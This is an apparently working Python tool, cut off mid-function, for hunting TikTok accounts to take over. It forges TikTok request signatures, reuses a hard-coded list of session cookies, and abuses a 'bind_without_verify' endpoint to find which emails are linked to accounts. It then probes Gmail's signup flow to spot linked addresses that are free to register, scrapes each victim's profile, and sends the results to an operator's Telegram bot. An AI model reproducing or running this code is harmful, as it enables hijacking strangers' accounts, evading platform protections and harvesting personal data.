import os
import threading
import datetime
from os import urandom
import binascii
import time,hashlib
import string,secrets
from urllib.parse import urlencode
import random,uuid
from concurrent.futures import ThreadPoolExecutor as F300
import sys
try:
    import requests
except ImportError:
    os.system("pip install requests")

try:
    import requests
except ImportError:
    os.system("pip install requests")

try:
    from user_agent import generate_user_agent as x
except ImportError:
    os.system("pip install user_agent")
    from user_agent import generate_user_agent as x

try:
    from SignerPy import sign, get
except ImportError:
    os.system("pip install SignerPy")
    from SignerPy import sign, get

try:
    import ST4
    from ST4 import HOTMAIL as nothing
except ImportError:
    os.system("pip install ST4")
    import ST4
    from ST4 import HOTMAIL as nothing

try:
    import hsopyt
except ImportError:
    os.system("pip install hsopyt")  # تأكد أن المكتبة موجودة على PyPI

P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
Y="\033[1;33m" # Yellow
class HSO:
    def __init__(self):
        self.logo= ''' ░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗
███████║███████║██╔████╔██║█████╗░░██║░░██║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░

██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

        '''
        self.id=input(f"{G}[ + ] id : {M} ")
        self.token=input(f"{G}[ + ] Token  : {M} ")
        os.system("cls" if os.name == "nt" else "clear")
        self.hit=0
        self.gt=0
        self.bt=0
        self.ge=0
        self.be=0
        self.secret=secrets.token_hex(16)
        self.ses=requests.Session()
        self.colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
        self.random_color = random.choice(self.colors)
        self.q=(self.random_color+self.logo)
        for i in self.q.splitlines():
            print(i)
            time.sleep(0.05)
        self.name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
        self.keyword= random.choice(
    [
    'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',  
    '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
    'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
    'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
    'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
    'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
    'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
    'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
    ]
    )
        self.birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
        #print(self.API_CH('chuechue201220@gmail.com'))
        self.dev="@ii33cc"
        self.select()
    def select(self):
        ii = '''
[ 1 ] = عشوائي جيميل
[ 2 ] = عشوائي هوتميل
[ 3 ] = فحص لسته جيميل
[ 4 ] = فحص لسته هوتميل
'''
        print(ii)
        try:
            self.sec = int(input("Choice Numper  : "))
        except Exception as e:
            print(e)
            exit("Error Input ")
        if self.sec == 1:
            try:
                self.max = int(input("input Numper For Threading 1-50 : "))
            except:
                exit("error Number  ")
            os.system("cls"if os.name=="nt"else"clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            for i in range(self.max):
                threading.Thread(target=self.serch_gm).start()
        elif self.sec ==2:
            try:
                self.max = int(input("input Numper For Threading 1-50 : "))
            except:
                exit("error Number  ")
            os.system("cls"if os.name=="nt"else"clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            for i in range(self.max):
                threading.Thread(target=self.Serch_hotmail).start()
        elif self.sec ==3:
            self.file = input("File Name > ")
            try:
                self.max = int(input("input Numper For Threading 1-50"))
            except:
                exit("error Number  ")
            os.system("cls"if os.name=="nt"else"clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            self.admin_gmail()
        elif self.sec ==4:
            self.file = input("File Name > ")
            try:
                self.max = int(input("input Numper For Threading 1-50"))
            except:
                exit("error Number  ")
            os.system("cls"if os.name=="nt"else"clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            self.admin_hotmail()

    def check_hotmai(self , email):
        try:
            data = nothing.CheckEmail(email)['data']['status']
            if data == True : 
                self.ge+=1
                self.info(email)
                sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()
                
            elif data == False:
                self.be +=1
                sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()
        except :
            pass
    def signn(self, params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
             x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
             data=payload
             if not unix: unix = int(time.time())
             return hsopyt.Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : hsopyt.Ladon.encrypt(unix, license_id, aid),"x-argus"   : hsopyt.Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}
    def info(self,email):
            self.hit+=1

            user= email.split("@")[0]
            patre = {
    "Host": "www.tiktok.com",
            "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3"
        }
            tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=patre).text
            try:
                getting = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
                id = str(getting.split('id":"')[1]).split('",')[0]
                name = str(getting.split('nickname":"')[1]).split('",')[0]
                bio = str(getting.split('signature":"')[1]).split('",')[0]
                country = str(getting.split('region":"')[1]).split('",')[0]
                private = str(getting.split('privateAccount":')[1]).split(',"')[0]
                followers = str(getting.split('followerCount":')[1]).split(',"')[0]
                following = str(getting.split('followingCount":')[1]).split(',"')[0]
                like = str(getting.split('heart":')[1]).split(',"')[0]
                video = str(getting.split('videoCount":')[1]).split(',"')[0]
                B = bin(int(id))[2:]
                L, BS = 0, ""
                while L < 31:
                    BS += B[L]
                    L += 1
                Date = datetime.datetime.fromtimestamp(int(BS, 2)).strftime('%Y')
                ff=f'''
═══════˛ 𝗧𝗶𝗸𝗧𝗼𝗸 .══════
Hit : {self.hit}
name :{name}
username : {user}
email : {email}
id :{id}
following : {following}
followers :{followers}
like : {like}
video : {video}
date : {Date}
privte : {private}
flag :{self.country_code_to_flag(country)}
country : {country}
prog : @AHMED_KHANA
═══════˛ 𝗧𝗶𝗸𝗧𝗼𝗸 .══════
    '''
                with open("TIKTOK.txt",'a',encoding="utf-8")as h:
                    h.write(ff+"\n")
                requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))
                
            except Exception as e:
                print(e)
                ff=f'''
═══════˛ 𝗧𝗶𝗸𝗧𝗼𝗸 .══════
hit :{self.hit}
username : {user}
email  : {email}
prog : @AHMED_KHANA
═══════˛ 𝗧𝗶𝗸𝗧𝗼𝗸 .══════
    @AHMED_KHANA'''
                with open("TIKTOK - BROKIN.txt",'a',encoding="utf-8")as h:
                    h.write(ff+"\n")
                requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))
    def API_CH(self , email ):
        cookies ={
            "passport_csrf_token": self.secret,
            "passport_csrf_token_default": self.secret,
            "sessionid":random.choice([           '4f5f81bc2848959420b073338ed54d56',
'6011989b80ef65d90533fe6aeedc253d',
'c5b4c473169b9c0b2408264f66169480',
'bb6b9933c604e2ad06994f5948b5e5e2',
'1bd5a14efd3cd6a932a99560fe33e722',
'5e4d9865cb984ef6158b874e1a716058',
'287427a2257b70959ca2eaddc2ed93d7',
'91879ed15c4897bee12933fbc85f7dbd',
'bfbc77e6b6080387483a8d65dc65b4d8',
'68fe5cb10014acb91b8b736040f15ecc',
'f85cde338cc29a9f422fd65597e881e3',
'e785f7619d34a01c5080d6aec845fb56',
'c3822f475d4e3595f597c7654fc13ddb',
'a02a87714453f84ee9cae66eb9eeccfa',
'fd5a5f1088fcef75ae69ca61d016e5d3',
'bc07039e102965fc3179c97ff21a8ab6',
'195e9b035b251c2d3634aa928dd9843e',
'7d171ca5d1f3ef7e66196931be68eba3',
'40bcd1acc1a0301ef3e271591d9457d2',
'74b0d1bed05b4be20e8843ffc19a48b3',
'14f26fa7763b7d5811f2666fe4da1209',
'7e003c92e691d84199b14839c1ef64b0',
'3e61ce7142962d916f4da9040b2fbd20',
'8dce1f1f0bd328bb846dfb377c90c365',
'ce434ca201e1ba3767873ccb70564fa4',
'7fab9165de8fc21a90c46d50d72d9401',
'525afdd4f29684e6fafbdeca93df035f',
'9590fa56fb2540b5f365b9a976458c01',
'def4d641a7f0e2e78b9beaa1b149e5dd',
'837a725616adf0f9c176f9dc305f3c35',
            ])
            }
        self.ses.cookies.update(cookies)
        device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
        device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
        regions = ["AE", "IQ", "US", "FR", "DE"]
        languages = ["en"]
        paramss = {
        'passport-sdk-version': "6030790",
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'ac': "WIFI",
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "360505",
        'version_name': "36.5.5",
        'device_platform': "android",
        'os': "android",
        'ab_version': "36.5.5",
        'ssmix': "a",
        'device_type': random.choice(device_types),
        'device_brand': random.choice(device_brands),
        'language': random.choice(languages),
        'os_api': str(random.randint(28, 34)),
        'os_version': str(random.randint(10, 14)),
        'openudid': str(binascii.hexlify(urandom(8)).decode()),
        'manifest_version_code': "2023605050",
        'resolution': "1440*2969",
        'dpi': str(random.choice([420, 480, 532])),
        'update_version_code': "2023605050",
        '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'is_pad': "0",
        'app_type': "normal",
        'sys_region': random.choice(regions),
        'last_install_time': str(random.randint(1600000000, 1700000000)),
        'mcc_mnc': "41820",
        'timezone_name': "Asia/Baghdad",
        'carrier_region_v2': "418",
        'app_language': random.choice(languages),
        'carrier_region': random.choice(regions),
        'ac2': "wifi",
        'uoo': "0",
        'op_region': random.choice(regions),
        'timezone_offset': str(random.randint(0, 14400)),
        'build_number': "36.5.5",
        'host_abi': "arm64-v8a",
        'locale': random.choice(languages),
        'region': random.choice(regions),
        'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'cdid': str(uuid.uuid4()),
        'support_webview': "1",
        'reg_store_region': random.choice(regions).lower(),
        'user_selected_region': "0",
        'cront_version': "1c651b66_2024-08-30",
        'ttnet_version': "4.2.195.8-tiktok",
        'use_store_region_cookie': "1",
        'ab_version':'37.8.5'
        }
        
        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",    'cdid': str(uuid.uuid4()),'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),    'iid': str(random.randint(1, 10**19)),    'device_id': str(random.randint(1, 10**19)),    'openudid': str(binascii.hexlify(urandom(8)).decode())}
        _rticket = params["_rticket"]
        device_id = params["device_id"]
        iid = params["iid"]
        cdid = params["cdid"]
        openudid = params["openudid"]
        _rticket = params["_rticket"]
        ts = params["ts"]
        params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
        device_type = params["device_type"]
        app_name = "com.zhiliaoapp.musically"
        app_version = f"{random.randint(2000000000, 3000000000)}"
        platform = "Linux"
        os = f"Android {random.randint(10, 15)}"
        locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
        locale = random.choice(locales)
        device_types = ["phone", "tablet", "tv"]
        device_type = random.choice(device_types)
        build = f"UP1A.{random.randint(200000000, 300000000)}"
        cronet_version = f"{random.randint(10000000, 20000000)}"
        cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        quic_version = f"{random.randint(10000000, 20000000)}"
        quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")

        m=self. signn(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': self. secret,
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-argus': m["x-argus"],
        'x-gorgon': m["x-gorgon"],
        'x-khronos': m["x-khronos"],
        'x-ladon': m["x-ladon"]
        }
        try:
            url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
            #url='https://api31-normal-useast1a.tiktokv.com/passport/email/bind'
            res = requests. post(url, params=params, headers=headers,data={"email":email},cookies=cookies).text
            #  print (res)

            if 'Email is linked to another account. Unlink or try another email.'in res:
                if "@gmail.com"in email:
                    self. check_email(email)
                #  system ('clear')            
                    self.gt+=1
                    sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()      
                # print (f" {F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}")    
                elif "@hotmail.com"in email:
                    self.check_hotmai(email)
                    self.gt+=1
                    sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()  
            else:
                if "@gmail.com"in email:          
                    self.bt+=1
                    sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()         
                elif "@hotmail.com"in email:
                    self.bt+=1
                    sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush() 
        except:
            pass
    def country_code_to_flag(self , code):
        if len(code) != 2:
            return "N/L"
        return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)
    def check_email(self,email):
        if '@' in email:email=email.split('@')[0]
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://accounts.google.com/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-browser-channel': 'stable',
                'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
                'x-browser-year': '2024',
            }

            params = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }

            r = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
            tl=r.url.split('TL=')[1]
            s1= r.text.split('"Qzxixc":"')[1].split('"')[0]
            at = r.text.split('"SNlM0e":"')[1].split('"')[0]
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'E815hb',
                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }

            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name,at)

            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text



            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.birthday[0],self.birthday[1],self.birthday[2],at)
            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }
            params = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text
            if 'steps/signup/password'in r:
                self.ge+=1
                email=email+"@gmail.com"
                self.domin =email.split("@")[1]
                self.info(email)
                #system ('clear')
                sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()          
                #print (f" {F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}")
            else:
              #  system ('clear')
                self.be+=1
                sys.stdout.write(f" \r{F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}"),sys.stdout.flush()
              #  print (f" {F}Tr:{M}{self.ge} {Z}FA:{M}{self.bt} {X}Not:{M}{self.be}")
        except Exception as e:
            ''
    def serch_gm(self):
        while True:
            keyword=''.join((random.choice(self.keyword) for i in range(random.randrange(4,9))))
            url = "https://search19-normal-alisg.tiktokv.com/aweme/v1/general/search/single/"
            params = {
                'cursor': '10',
                'enable_lite_workflow': '0',
                'enter_from': 'homepage_hot',
                'enable_lite_cut': '1',
                'backtrace': 'ad_cursor%253D12%253Bcs_next_img_group%253D1%253Bcurrent_page%253D1%253Brs_card_next_index%253D0%253Brs_next_a%253D1%253Brs_next_index%253D4%253Brs_word_next_index%253D0',
                'count': '20',
                'last_search_id': '202505031730279957F33446D550A9EB88',
                'end_to_end_search_session_id': '',
                'keyword':keyword ,
                'query_correct_type': '0',
                'search_source': 'normal_search',
                'search_id': '20250503173028ABF760554790F9B05684',
